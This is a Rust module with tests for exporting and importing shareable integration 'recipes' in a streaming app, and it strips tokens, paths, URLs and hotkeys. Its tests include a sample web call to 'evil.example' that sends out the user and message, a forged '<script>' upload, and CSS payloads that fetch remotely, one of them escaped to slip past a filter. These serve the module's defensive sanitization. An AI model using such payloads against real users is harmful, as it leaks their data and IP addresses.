//! Recipes: integrations shared as a line of text (`ic-recipe:1:...`).
//!
//! A recipe is data, never code, and carries nothing private:
//! - Discord connections are replaced by a placeholder; the importer picks
//!   one of their own connections for it.
//! - Web call links get new secret tokens on import, and buttons a new
//!   Stream Deck address.
//! - Hotkeys and MIDI pads are left for the importer to pick: a pad names
//!   the sharer's controller, and their keys may be taken on another PC.
//! - Everything imported arrives switched off.
//! - Steps that run programs or write files are flagged, and the import
//!   needs an explicit yes for them.
//! - Alerts come with the sharer's alerts theme and the sounds and pictures
//!   they uploaded for them (up to `MAX_SHARED_MEDIA`). The importer
//!   chooses whether to use the theme; an upload that didn't come along
//!   falls back to the theme sound, or no picture.
//!
//! Import cleans exactly what export does, so a recipe written by hand
//! can't bring in a web address, a program or a hotkey the user never set.

use super::alert_media::{self, Kind, REF_PREFIX};
use super::alerts::{is_web_link, Look, THEME_SOUND};
use super::model::{visit_steps, Integration, Step, StepKind, Trigger};
use crate::json::{self, Value};
use std::collections::BTreeMap;
use std::path::Path;

const PREFIX: &str = "ic-recipe:1:";
/// Placeholder a shared Discord step points at until the importer maps it.
pub const DISCORD_PLACEHOLDER: &str = "@discord";
/// Uploaded sounds and pictures make a recipe big: room for a few. Each
/// upload is encoded twice (in the recipe, then the recipe as a whole), so
/// `MAX_SHARED_MEDIA` of them grows by 16/9; 1 MB more is the integrations.
const MAX_RECIPE_LEN: usize = MAX_SHARED_MEDIA * 16 / 9 + 1024 * 1024;
const MAX_RECIPE_INTEGRATIONS: usize = 20;
/// The most uploads a recipe brings along, all together.
const MAX_SHARED_MEDIA: usize = 4 * 1024 * 1024;

pub struct Recipe {
    pub name: String,
    pub integrations: Vec<Integration>,
    pub alerts: Option<SharedAlerts>,
}

/// What alerts in a recipe bring: the sharer's theme and their uploads.
pub struct SharedAlerts {
    pub look: Look,
    /// (name, file) for each upload the shared alerts use.
    pub media: Vec<(String, Vec<u8>)>,
    /// Uploads they use that were too big to come along.
    pub left_out: Vec<String>,
}

impl Recipe {
    pub fn uses_discord(&self) -> bool {
        self.integrations.iter().any(|i| {
            let mut found = false;
            for h in &i.handlers {
                visit_steps(&h.steps, &mut |s| found |= s.kind == StepKind::Discord);
            }
            found
        })
    }

    pub fn has_local_effects(&self) -> bool {
        self.integrations.iter().any(Integration::has_local_effects)
    }
}

/// The recipe text. With `look`, alerts among `integrations` bring that
/// theme and the uploads (from `media_folder`) they play or show.
pub fn export(
    name: &str,
    integrations: &[Integration],
    look: Option<&Look>,
    media_folder: &Path,
) -> String {
    let cleaned: Vec<Value> = integrations
        .iter()
        .map(|i| {
            let mut i = i.clone();
            make_private(&mut i);
            i.to_json()
        })
        .collect();
    let mut doc = vec![
        ("name".to_string(), json::str(name)),
        ("integrations".to_string(), Value::Arr(cleaned)),
    ];
    if let Some(look) = look.filter(|_| integrations.iter().any(shows_alerts)) {
        doc.push((
            "alerts".to_string(),
            alerts_json(integrations, look, media_folder),
        ));
    }
    format!(
        "{PREFIX}{}",
        base64url_encode(Value::Obj(doc).to_json().as_bytes())
    )
}

fn shows_alerts(i: &Integration) -> bool {
    let mut found = false;
    for h in &i.handlers {
        visit_steps(&h.steps, &mut |s| found |= s.kind == StepKind::Overlay);
    }
    found
}

/// The uploads alerts among `integrations` use, and the theme's own sound.
fn media_used(integrations: &[Integration], look: &Look) -> Vec<String> {
    let mut names = Vec::new();
    let mut note = |value: &str| {
        if let Some(name) = value.strip_prefix(REF_PREFIX) {
            if !names.iter().any(|n| n == name) {
                names.push(name.to_string());
            }
        }
    };
    note(&look.sound);
    for i in integrations {
        for h in &i.handlers {
            visit_steps(&h.steps, &mut |s| {
                if s.kind == StepKind::Overlay {
                    note(s.param("sound"));
                    note(s.param("image"));
                }
            });
        }
    }
    names
}

fn alerts_json(integrations: &[Integration], look: &Look, media_folder: &Path) -> Value {
    let mut room = MAX_SHARED_MEDIA;
    let mut media = Vec::new();
    let mut left_out = Vec::new();
    for name in media_used(integrations, look) {
        let file =
            alert_media::locate(media_folder, &name).and_then(|(path, _)| std::fs::read(path).ok());
        match file {
            Some(data) if data.len() <= room => {
                room -= data.len();
                media.push(json::obj([
                    ("name", json::str(&name)),
                    ("data", json::str(base64url_encode(&data))),
                ]));
            }
            _ => left_out.push(json::str(&name)),
        }
    }
    json::obj([
        ("look", look.to_json()),
        ("media", Value::Arr(media)),
        ("left_out", Value::Arr(left_out)),
    ])
}

/// Blank whatever a recipe must never carry: see `strip_private`, plus web
/// call tokens and the hotkey, pad or Stream Deck address a button starts
/// from.
fn make_private(i: &mut Integration) {
    for h in &mut i.handlers {
        strip_private(&mut h.steps);
        match &mut h.trigger {
            Trigger::Webhook { token } => token.clear(),
            Trigger::Shortcut {
                hotkey,
                midi,
                token,
                ..
            } => {
                hotkey.clear();
                midi.clear();
                token.clear();
            }
            _ => {}
        }
    }
}

/// Whether a web request body is one the catalog itself writes (an on-air
/// light state, the webhook's event JSON): those only say what happened,
/// so a recipe keeps them, or an imported light would send nothing a
/// device reads. Any other body can hold a key and goes. Judged by the
/// body itself, never by what the recipe says it is.
fn is_catalog_body(body: &str) -> bool {
    super::presets::LIGHT_STARTS
        .iter()
        .any(|light| light.bodies.contains(&body))
        || super::event::EventKind::ALL
            .iter()
            .any(|kind| body == super::presets::webhook_body(*kind))
}

/// The Discord connection, web requests (address, headers and body hold
/// API keys and webhook secrets), programs and files (their paths and
/// arguments name the user's folders and carry tokens), and OBS steps'
/// scene and source: the importer picks their own, so a recipe can never
/// switch a scene or hide a source the user didn't choose.
fn strip_private(steps: &mut [super::model::Step]) {
    for s in steps {
        match s.kind {
            StepKind::Discord => {
                s.params
                    .insert("connection".into(), DISCORD_PLACEHOLDER.into());
            }
            StepKind::Http => {
                s.params.insert("url".into(), String::new());
                s.params.remove("headers");
                if !is_catalog_body(s.param("body")) {
                    s.params.remove("body");
                }
            }
            StepKind::Obs => {
                s.params.insert("scene".into(), String::new());
                s.params.insert("source".into(), String::new());
                s.params.remove("filter");
            }
            StepKind::Program => {
                s.params.insert("path".into(), String::new());
                s.params.remove("args");
            }
            StepKind::File => {
                s.params.insert("path".into(), String::new());
            }
            // A picture or sound linked from the web would load from that
            // site on stream (the streamer's IP, and a file it can change
            // later): it falls back to no picture, or the theme sound, as an
            // upload too big to come along does.
            StepKind::Overlay => {
                if is_web_link(s.param("image")) {
                    s.params.insert("image".into(), String::new());
                }
                if is_web_link(s.param("sound")) {
                    s.params.insert("sound".into(), THEME_SOUND.into());
                }
            }
            // A light on someone's own network: the color stays.
            StepKind::Light => {
                s.params.insert("device".into(), String::new());
                s.params.insert("name".into(), String::new());
            }
            _ => {}
        }
        strip_private(&mut s.then);
        strip_private(&mut s.otherwise);
    }
}

/// Parse a pasted recipe. `new_id` makes fresh ids so an import never
/// overwrites what the user already has.
pub fn parse(text: &str, mut new_id: impl FnMut() -> String) -> Result<Recipe, String> {
    let text = text.trim();
    if text.len() > MAX_RECIPE_LEN {
        return Err("that recipe is too big".to_string());
    }
    let encoded = text
        .strip_prefix(PREFIX)
        .ok_or("that is not an InstantClone recipe (it should start with ic-recipe:1:)")?;
    let bytes = base64url_decode(encoded).ok_or("the recipe is damaged; copy it again")?;
    let doc = std::str::from_utf8(&bytes)
        .ok()
        .and_then(|t| json::parse(t).ok())
        .ok_or("the recipe is damaged; copy it again")?;
    let list = doc
        .get("integrations")
        .and_then(Value::as_array)
        .unwrap_or(&[]);
    if list.is_empty() || list.len() > MAX_RECIPE_INTEGRATIONS {
        return Err("the recipe has no integrations, or too many".to_string());
    }
    let mut integrations = Vec::new();
    for v in list {
        let mut i = Integration::from_json(v)?;
        if let Some(problem) = i.problems().invalid.first() {
            return Err(format!(
                "the recipe has something unsafe or broken: {problem}"
            ));
        }
        make_private(&mut i);
        i.id = new_id();
        i.enabled = false;
        // Fresh secrets: a web call keeps working, and a button can be
        // pressed from a Stream Deck before any key or pad is picked.
        for h in &mut i.handlers {
            match &mut h.trigger {
                Trigger::Webhook { token } | Trigger::Shortcut { token, .. } => {
                    *token = new_id() + &new_id();
                }
                _ => {}
            }
        }
        integrations.push(i);
    }
    Ok(Recipe {
        name: doc
            .str_or("name", "Shared recipe")
            .chars()
            .take(80)
            .collect(),
        integrations,
        alerts: doc.get("alerts").map(parse_alerts).transpose()?,
    })
}

/// The theme and uploads a recipe brings. Every upload must be a sound or
/// picture this app would keep itself, within the same limits.
fn parse_alerts(v: &Value) -> Result<SharedAlerts, String> {
    let damaged = || "the recipe's alerts are damaged; copy it again".to_string();
    let mut media = Vec::new();
    let mut total = 0;
    for m in v.get("media").and_then(Value::as_array).unwrap_or(&[]) {
        let name = m.str_or("name", "");
        let data = base64url_decode(m.str_or("data", "")).ok_or_else(damaged)?;
        total += data.len();
        let fits = data.len() <= alert_media::MAX_BYTES && total <= MAX_SHARED_MEDIA;
        if alert_media::type_of(name).is_none() || data.is_empty() || !fits {
            return Err(damaged());
        }
        media.push((name.to_string(), data));
    }
    let left_out = v
        .get("left_out")
        .and_then(Value::as_array)
        .unwrap_or(&[])
        .iter()
        .filter_map(Value::as_str)
        .filter(|n| alert_media::type_of(n).is_some())
        .take(50)
        .map(str::to_string)
        .collect();
    let mut look = Look::from_json(v.get("look").unwrap_or(&Value::Null));
    look.css = css_that_stays_here(&look.css);
    // A theme sound linked from the web: as for an alert's own, see
    // `strip_private`.
    if is_web_link(&look.sound) {
        look.sound = Look::default().sound;
    }
    Ok(SharedAlerts {
        look,
        media,
        left_out,
    })
}

/// A shared theme's custom CSS, kept only if it can't fetch anything. The
/// alerts page plays in OBS on stream: a `url(` or `@import` in someone
/// else's CSS would show that site the streamer's IP, and let it change
/// what goes on stream later. A backslash drops it too, as a CSS escape can
/// spell `url(` in a way a plain search can't see. The rest of the theme
/// (colors, font, place, motion) still comes along.
fn css_that_stays_here(css: &str) -> String {
    let lower = css.to_ascii_lowercase();
    let fetches = ["url(", "@import", "image-set(", "\\"]
        .iter()
        .any(|token| lower.contains(token));
    if fetches {
        String::new()
    } else {
        css.to_string()
    }
}

/// Point the imported alerts (and `look`, when the importer takes it) at
/// where their uploads were saved: `saved` maps the sharer's names to
/// this PC's. An upload that didn't come along falls back to the theme
/// sound, or no picture, so the alert still plays.
pub fn point_media(recipe: &mut Recipe, look: Option<&mut Look>, saved: &BTreeMap<String, String>) {
    let moved = |value: &str| -> Option<String> {
        let name = value.strip_prefix(REF_PREFIX)?;
        Some(
            saved
                .get(name)
                .map_or(String::new(), |n| format!("{REF_PREFIX}{n}")),
        )
    };
    for i in &mut recipe.integrations {
        for h in &mut i.handlers {
            point_steps(&mut h.steps, &moved);
        }
    }
    if let Some(look) = look {
        if let Some(sound) = moved(&look.sound) {
            look.sound = sound;
        }
    }
}

fn point_steps(steps: &mut [Step], moved: &impl Fn(&str) -> Option<String>) {
    for s in steps {
        if s.kind == StepKind::Overlay {
            if let Some(sound) = moved(s.param("sound")) {
                let sound = if sound.is_empty() {
                    THEME_SOUND.to_string()
                } else {
                    sound
                };
                s.params.insert("sound".into(), sound);
            }
            if let Some(image) = moved(s.param("image")) {
                s.params.insert("image".into(), image);
            }
        }
        point_steps(&mut s.then, moved);
        point_steps(&mut s.otherwise, moved);
    }
}

/// Keep a shared upload: a file here with the same bytes (and kind) is
/// used as it is, so importing twice adds nothing; otherwise it's saved
/// like any upload.
pub fn keep_shared_media(folder: &Path, name: &str, data: &[u8]) -> Result<String, String> {
    let kind = alert_media::type_of(name).map(|(kind, _)| kind);
    let same = alert_media::list(folder).into_iter().find(|m| {
        Some(m.kind) == kind
            && m.bytes == data.len() as u64
            && std::fs::read(folder.join(&m.name)).is_ok_and(|here| here == data)
    });
    match same {
        Some(m) => Ok(m.name),
        None => alert_media::save(folder, name, data),
    }
}

/// Whether an upload is a sound or a picture, for the import preview.
pub fn media_kind(name: &str) -> &'static str {
    alert_media::type_of(name).map_or("file", |(kind, _)| match kind {
        Kind::Sound => "sound",
        Kind::Picture => "picture",
    })
}

/// Point every placeholder Discord step at `channel`.
pub fn map_discord(recipe: &mut Recipe, channel: &str) {
    for i in &mut recipe.integrations {
        for h in &mut i.handlers {
            map_steps(&mut h.steps, channel);
        }
    }
}

fn map_steps(steps: &mut [super::model::Step], channel: &str) {
    for s in steps {
        if s.kind == StepKind::Discord && s.param("connection") == DISCORD_PLACEHOLDER {
            s.params.insert("connection".into(), channel.to_string());
        }
        map_steps(&mut s.then, channel);
        map_steps(&mut s.otherwise, channel);
    }
}

const ALPHABET: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

fn base64url_encode(data: &[u8]) -> String {
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let n = chunk.iter().fold(0u32, |acc, b| (acc << 8) | *b as u32) << (8 * (3 - chunk.len()));
        for i in 0..=chunk.len() {
            out.push(ALPHABET[((n >> (18 - 6 * i)) & 63) as usize] as char);
        }
    }
    out
}

pub(super) fn base64url_decode(text: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(text.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0;
    for c in text
        .bytes()
        .filter(|c| !c.is_ascii_whitespace() && *c != b'=')
    {
        let v = ALPHABET.iter().position(|a| *a == c)? as u32;
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Some(out)
}

#[cfg(test)]
mod tests {
    use super::super::presets;
    use super::*;

    /// An alert's picture or sound linked from the web would load from that
    /// site on the importer's stream: it falls back as a missing upload does.
    #[test]
    fn alerts_linked_from_the_web_stay_behind() {
        let mut steps = vec![Step::new(
            StepKind::Overlay,
            &[
                ("image", "https://x.example/y.gif"),
                ("sound", "https://x.example/s.mp3"),
                ("text", "{user} followed"),
            ],
        )];
        strip_private(&mut steps);
        assert_eq!(steps[0].param("image"), "");
        assert_eq!(steps[0].param("sound"), THEME_SOUND);
        assert_eq!(steps[0].param("text"), "{user} followed");
        let mut upload = vec![Step::new(StepKind::Overlay, &[("sound", "media:ding.mp3")])];
        strip_private(&mut upload);
        assert_eq!(
            upload[0].param("sound"),
            "media:ding.mp3",
            "an upload stays"
        );
    }

    /// The largest recipe export writes must be one import takes. With the
    /// uploads encoded twice, 4 MB of them used to come to 7.1 MB of text,
    /// over the 6 MB import refused.
    #[test]
    fn the_largest_export_fits_the_import_limit() {
        let encoded = |n: usize| n.div_ceil(3) * 4;
        let integrations = 512 * 1024;
        let largest = PREFIX.len() + encoded(encoded(MAX_SHARED_MEDIA) + integrations);
        assert!(largest <= MAX_RECIPE_LEN, "{largest} > {MAX_RECIPE_LEN}");
    }

    /// Someone else's CSS could fetch from their server while the alerts
    /// page is on stream: any way of fetching drops it, styling stays.
    #[test]
    fn shared_css_that_could_fetch_anything_is_left_out() {
        let styling = ".card{border-radius:4px;color:#fff}";
        assert_eq!(css_that_stays_here(styling), styling);
        for fetching in [
            ".card{background:url(https://x.example/y.png)}",
            "@import 'https://x.example/f.css';",
            ".card{background:URL(//x.example/y.png)}",
            ".card{background-image:image-set('y.png' 1x)}",
            r".card{background:\75rl(https://x.example/y.png)}",
        ] {
            assert_eq!(css_that_stays_here(fetching), "", "{fetching}");
        }
    }

    struct Scratch(std::path::PathBuf);
    impl Drop for Scratch {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }
    fn scratch(tag: &str) -> Scratch {
        Scratch(std::env::temp_dir().join(format!(
            "ic-recipe-{tag}-{}",
            &crate::crypto::random_token()[..8]
        )))
    }

    fn first_alert(i: &mut Integration) -> &mut Step {
        i.handlers[0]
            .steps
            .iter_mut()
            .find(|s| s.kind == StepKind::Overlay)
            .unwrap()
    }

    /// A friend's alerts arrive looking and sounding like theirs: their
    /// theme comes along, and so do their uploads, saved here (beside a
    /// different file of the same name) and pointed at. One too big to
    /// come along falls back instead of pointing at nothing.
    #[test]
    fn alerts_bring_their_theme_and_uploads() {
        let (theirs, mine) = (scratch("theirs"), scratch("mine"));
        alert_media::save(&theirs.0, "ding.mp3", b"ID3ding").unwrap();
        alert_media::save(&mine.0, "ding.mp3", b"ID3other").unwrap();
        let mut alert = presets::build("twitch_alerts", "a1".into(), "").unwrap();
        let step = first_alert(&mut alert);
        step.params.insert("sound".into(), "media:ding.mp3".into());
        step.params.insert("image".into(), "media:gone.gif".into());
        let look = Look {
            theme: "signal".into(),
            sound: "media:ding.mp3".into(),
            css: ".card{letter-spacing:1px}".into(),
            ..Look::default()
        };
        let text = export("Alerts", &[alert], Some(&look), &theirs.0);
        let mut recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
        let shared = recipe.alerts.take().unwrap();
        assert_eq!(shared.look, look);
        assert_eq!(shared.left_out, ["gone.gif"]);
        let (name, data) = &shared.media[0];
        let kept = keep_shared_media(&mine.0, name, data).unwrap();
        assert_eq!(kept, "ding-2.mp3");
        assert_eq!(
            keep_shared_media(&mine.0, name, data).unwrap(),
            "ding-2.mp3"
        );
        let saved = BTreeMap::from([(name.clone(), kept)]);
        let mut theme = shared.look.clone();
        point_media(&mut recipe, Some(&mut theme), &saved);
        let step = first_alert(&mut recipe.integrations[0]);
        assert_eq!(step.param("sound"), "media:ding-2.mp3");
        assert_eq!(step.param("image"), "");
        assert_eq!(theme.sound, "media:ding-2.mp3");
    }

    /// A recipe can't smuggle in a page or a script as an "upload", and
    /// one without alerts brings no theme.
    #[test]
    fn shared_uploads_must_be_sounds_or_pictures() {
        let forged = json::obj([(
            "media",
            Value::Arr(vec![json::obj([
                ("name", json::str("page.html")),
                ("data", json::str(base64url_encode(b"<script>"))),
            ])]),
        )]);
        assert!(parse_alerts(&forged).is_err());
        let chat = presets::build("delay_command", "c1".into(), "").unwrap();
        let text = export("x", &[chat], Some(&Look::default()), Path::new(""));
        assert!(parse(&text, || "fresh1234567890ab".into())
            .unwrap()
            .alerts
            .is_none());
    }

    #[test]
    fn base64_round_trips_every_length() {
        for len in 0..40 {
            let data: Vec<u8> = (0..len).map(|i| (i * 37 + 11) as u8).collect();
            assert_eq!(base64url_decode(&base64url_encode(&data)).unwrap(), data);
        }
        assert!(base64url_decode("abc*").is_none());
    }

    #[test]
    fn export_hides_connections_and_import_starts_off() {
        let alert = presets::build("crash_alert", "a1".into(), "my-private-channel").unwrap();
        let text = export("Crash kit", &[alert], None, Path::new(""));
        assert!(text.starts_with(PREFIX));
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("my-private-channel"));

        let mut n = 0;
        let mut recipe = parse(&text, || {
            n += 1;
            format!("new{n}")
        })
        .unwrap();
        assert_eq!(recipe.name, "Crash kit");
        assert!(recipe.uses_discord());
        let imported = &recipe.integrations[0];
        assert_eq!(imported.id, "new1");
        assert!(!imported.enabled);

        map_discord(&mut recipe, "mine");
        assert_eq!(
            recipe.integrations[0].handlers[0].steps[0].param("connection"),
            "mine"
        );
    }

    #[test]
    fn addresses_headers_and_paths_are_never_shared() {
        use super::super::model::Step;
        let mut i = presets::build("webhook", "w".into(), "").unwrap();
        i.handlers[0].steps = vec![
            Step::new(
                StepKind::Http,
                &[
                    ("url", "https://api.example/secret-key"),
                    ("headers", "Authorization: Bearer s3cret"),
                ],
            ),
            Step::new(
                StepKind::File,
                &[("path", r"C:\Users\oriol\stream.txt"), ("text", "x")],
            ),
        ];
        let text = export("x", &[i], None, Path::new(""));
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        for secret in ["secret-key", "s3cret", "oriol"] {
            assert!(!decoded.contains(secret), "{secret} leaked");
        }
    }

    #[test]
    fn web_call_tokens_are_never_shared() {
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Webhook {
            token: "secret-token-1234567890".into(),
        };
        let text = export("x", &[i], None, Path::new(""));
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("secret-token"));
        let recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
        match &recipe.integrations[0].handlers[0].trigger {
            Trigger::Webhook { token } => assert!(token.starts_with("fresh")),
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn shortcuts_are_left_for_the_importer() {
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Shortcut {
            hotkey: "Ctrl+Alt+K".into(),
            midi: "note:1:36@Oriol's Launchpad".into(),
            token: String::new(),
            only_live: false,
        };
        let text = export("x", &[i], None, Path::new(""));
        let decoded = String::from_utf8(base64url_decode(&text[PREFIX.len()..]).unwrap()).unwrap();
        assert!(!decoded.contains("Launchpad") && !decoded.contains("Ctrl+Alt+K"));
        assert!(
            parse(&text, || "fresh1234567890ab".into()).is_ok(),
            "still imports, unfinished"
        );
    }

    #[test]
    fn a_shared_light_keeps_what_each_state_sends_and_buttons_get_an_address() {
        let light = presets::build("on_air_light", "l".into(), "").unwrap();
        let highlight = presets::build("highlight", "h".into(), "").unwrap();
        let text = export("studio", &[light, highlight], None, Path::new(""));
        let mut n = 0;
        let recipe = parse(&text, || {
            n += 1;
            format!("fresh{n:011}")
        })
        .unwrap();
        let step = &recipe.integrations[0].handlers[0].steps[0];
        assert_eq!(step.param("color"), "red", "what it shows stays");
        assert_eq!(step.param("device"), "", "whose light it is goes");
        match &recipe.integrations[1].handlers[0].trigger {
            Trigger::Shortcut { token, hotkey, .. } => {
                assert!(token.starts_with("fresh") && hotkey.is_empty(), "{token}")
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn a_recipe_never_picks_an_obs_scene_or_a_made_up_body() {
        use super::super::model::Step;
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.preset = "on_air_light".into();
        i.handlers[0].steps = vec![
            Step::new(StepKind::Obs, &[("action", "hide"), ("source", "Camera")]),
            Step::new(
                StepKind::Http,
                &[("url", "https://x.example/"), ("body", "key=secret")],
            ),
        ];
        let recipe = parse(&export("x", &[i], None, Path::new("")), || {
            "fresh1234567890ab".into()
        })
        .unwrap();
        let steps = &recipe.integrations[0].handlers[0].steps;
        assert_eq!(steps[0].param("source"), "");
        assert_eq!(
            steps[1].param("body"),
            "",
            "claiming to be a light keeps nothing"
        );
    }

    #[test]
    fn a_hand_written_recipe_is_cleaned_on_import() {
        use super::super::model::Step;
        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
        i.handlers[0].trigger = Trigger::Shortcut {
            hotkey: "Ctrl+C".into(),
            midi: String::new(),
            token: String::new(),
            only_live: false,
        };
        i.handlers[0].steps = vec![Step::new(
            StepKind::Http,
            &[
                ("url", "https://evil.example/?u={user}"),
                ("body", "{message}"),
            ],
        )];
        // Encoded by hand, skipping the cleaning `export` does.
        let doc = json::obj([("integrations", Value::Arr(vec![i.to_json()]))]);
        let text = format!("{PREFIX}{}", base64url_encode(doc.to_json().as_bytes()));
        let recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
        let h = &recipe.integrations[0].handlers[0];
        assert_eq!(h.steps[0].param("url"), "");
        assert_eq!(h.steps[0].param("body"), "");
        assert!(matches!(&h.trigger, Trigger::Shortcut { hotkey, .. } if hotkey.is_empty()));
    }

    #[test]
    fn junk_is_refused() {
        assert!(parse("hello", || "x".into()).is_err());
        assert!(parse("ic-recipe:1:!!!", || "x".into()).is_err());
        assert!(
            parse(&format!("{PREFIX}{}", base64url_encode(b"{}")), || "x"
                .into())
            .is_err()
        );
    }
}
